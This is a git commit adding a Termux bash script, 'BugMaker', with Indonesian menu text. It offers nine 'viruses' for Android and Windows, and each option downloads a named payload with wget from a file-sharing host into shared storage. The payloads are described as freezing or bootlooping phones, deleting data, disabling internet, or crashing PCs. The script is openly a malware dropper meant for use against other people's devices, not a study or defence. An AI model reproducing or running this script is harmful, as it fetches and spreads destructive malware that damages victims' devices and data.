070d2982fdca501f1a2981b909f3115fdac40b79
FajarFirdaus732 <35714197+FajarTheGGman@users.noreply.github.com>
2018-12-08 10:06:39 +0700

    Add files via upload

---
+++ bugmaker.sh
@@ -0,0 +1,115 @@
+#!/usr/bin/bash
+pkg install wget -y
+pkg install toilet -y 
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo "\033[36;1m<======================================>"
+echo $cyan "Coder : Fajar Firdaus "
+echo $cyan "Fb : https://www.facebook.com/Ace.of.spades729"
+echo $cyan "IG : fajar_firdaus_7"
+echo $cyan "YT : iTech7732"
+echo "\033[36;1m<======================================>"
+sleep 1
+termux-setup-storage
+toilet -f future.flf +---+BugMaker+---+ --gay
+echo "\033[31;1m[$]=====================================[$]"
+echo "+-----------------+[Virus Buat Android]+-----------------+"
+echo "(1).> Freeze (Bikin Lag hp lo)"
+echo "(2).> Bootloop (Bikin Hp lo stuck di booting screen)"
+echo "(3).> Elite (Gk tau coba aja sendiri)"
+echo "(4).> Dataeater (Hapus Data memory hp lo)"
+echo "(5).> Bomzip (Gk tau :V)"
+echo "+-----------------+[Virus Buat Windows]+-----------------+"
+echo "(6).> disableinternet (auto matiin internet lu)"
+echo "(7).> crash (auto bikin crash pc lo )"
+echo "(8).> CD_LOOP (Bikin Tempat Cd lo keluar masuk sendiri)"
+echo "(9).> bom_notepad (bom notepad)"
+echo "\033[31;1m[$]=====================================[$]"
+read -p "root@BugMaker-#" asw
+
+if [ $asw = 1 ] || [ $asw = 1 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/9MVwLApP/695/freeze.apk
+mv freeze.apk /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus freeze.apk)"
+fi
+
+if [ $asw = 2 ] || [ $asw = 2 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/dJOmFZep/610/bootloop.apk
+mv bootloop.apk /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus bootloop.apk)"
+fi
+
+if [ $asw = 3 ] || [ $asw = 3 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/WXgMhpvB/56/elite.apk
+mv elite.apk /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus elite.apk)"
+fi
+
+if [ $asw = 4 ] || [ $asw = 4 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/W0axLZOF/239/dateater.apk
+echo "Done! Lihat Virus di memory internal (nama virus dataeater.apk)"
+fi
+
+if [ $asw = 5 ] || [ $asw = 5 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/1oHO5Swu/74/bomzip.apk
+mv bomzip.apk /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus bomzip.apk)"
+fi
+
+if [ $asw = 6 ] || [ $asw = 6 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/LPDVCM86/1008/disableinternet.exe
+mv disableinternet.exe /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus disableinternet.exe)"
+fi
+
+if [ $asw = 7 ] || [ $asw = 7 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/HHDGMxzZ/620/crash.exe
+mv crash.exe /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus crash.exe)"
+fi
+
+if [ $asw = 8 ] || [ $asw = 8 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/hhBN9rKi/166/CD_LOOP.exe
+mv CD_LOOP.exe /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus CD_LOOP.exe)"
+fi
+
+if [ $asw = 9 ] || [ $asw = 9 ]
+then
+clear
+wget --no-check-certificate https://www18.zippyshare.com/d/L5AxS7oi/635/bom_notepad.exe
+mv bom_notepad.exe /storage/emulated/0
+echo "Done! Lihat Virus di memory internal (nama virus bom_notepad.exe)"
+fi
+
+if [ $asw = 0 ] || [ $asw = 0 ]
+then
+echo "\033[31;1mTerimakasih Telah Menggunakan Tools ini"
+sleep 1
+echo "\033[31;1mRecode w Bacok lo !!"
+sleep 1
+echo "Copyright© 2018 By Fajar Firdaus"
+exit
+fi
